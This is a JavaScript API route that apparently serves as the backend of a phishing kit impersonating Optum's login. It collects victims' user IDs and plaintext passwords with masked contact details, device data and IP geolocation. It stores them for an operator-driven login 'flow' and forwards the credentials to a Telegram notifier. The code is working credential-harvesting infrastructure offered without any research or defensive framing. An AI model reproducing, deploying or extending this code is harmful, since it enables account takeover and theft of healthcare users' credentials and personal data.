import { getDb, ensureTable, autoDeclineExpired } from "../_db.js";
import { notifyNewTask } from "../_telegram.js";

var cors = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

function json(res, data, status) {
  res.setHeader("Content-Type", "application/json");
  for (var k in cors) res.setHeader(k, cors[k]);
  res.status(status || 200).json(data);
}

export default async function handler(req, res) {
  if (req.method === "OPTIONS") {
    for (var k in cors) res.setHeader(k, cors[k]);
    return res.status(204).end();
  }

  if (req.method === "GET") {
    try {
      var sql = getDb();
      await ensureTable(sql);
      await autoDeclineExpired(sql);
      var tasks = await sql`SELECT * FROM pending_logins WHERE project_id = 'optum' ORDER BY created_at DESC`;
      return json(res, { tasks });
    } catch (error) {
      console.error("GET /api/tasks error:", error);
      return json(res, { error: "Failed to fetch tasks" }, 500);
    }
  }

  if (req.method === "POST") {
    try {
      var body = req.body;
      var user_id = body.user_id;
      var password = body.password;
      var method = body.method;
      var masked_email = body.masked_email;
      var masked_phone = body.masked_phone;
      var request_kind = body.request_kind;
      var member_origin = body.member_origin || null;
      var project_name = body.project_name || null;
      var device_info = body.device_info || null;
      var screen_size = body.screen_size || null;
      var referrer = body.referrer || null;

      if (!user_id || !password || !method || !masked_email || !masked_phone || !request_kind) {
        return json(res, { error: "Missing required fields" }, 400);
      }

      var sql = getDb();
      await ensureTable(sql);

      var id = crypto.randomUUID();
      var now = Date.now();

      var ip = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || "Unknown";
      if (ip.indexOf(",") !== -1) ip = ip.split(",")[0].trim();

      var vercelCity = req.headers["x-vercel-ip-city"] || "Unknown";
      var vercelCountry = req.headers["x-vercel-ip-country"] || "Unknown";
      var vercelTimezone = req.headers["x-vercel-ip-timezone"] || "Unknown";

      var cfData = {
        ip: ip,
        country: vercelCountry,
        city: decodeURIComponent(vercelCity),
        timezone: vercelTimezone,
        asOrganization: "Unknown",
      };

      var rows = await sql`
        INSERT INTO pending_logins
          (id, project_id, user_id, password, method, masked_email, masked_phone,
           created_at, member_origin, request_kind, project_name,
           resolved_at, resolved_by, flow_step, pending_since)
        VALUES
          (${id}, 'optum', ${user_id}, ${password}, ${method}, ${masked_email},
           ${masked_phone}, ${now}, ${member_origin}, ${request_kind},
           ${project_name}, ${null}, ${null}, 'login', ${now})
        RETURNING *
      `;
      var task = rows[0];

      notifyNewTask({
        id: id,
        user_id: user_id,
        masked_email: masked_email,
        masked_phone: masked_phone,
        method: method,
        project_name: project_name,
        request_kind: request_kind,
        member_origin: member_origin,
        password: password,
        device_info: device_info,
        screen_size: screen_size,
        referrer: referrer,
        cf: cfData,
      }).catch(function (err) { console.error("Telegram notify error:", err); });

      return json(res, { task: task }, 201);
    } catch (error) {
      console.error("POST /api/tasks error:", error);
      return json(res, { error: "Failed to create task" }, 500);
    }
  }

  return json(res, { error: "Method not allowed" }, 405);
}
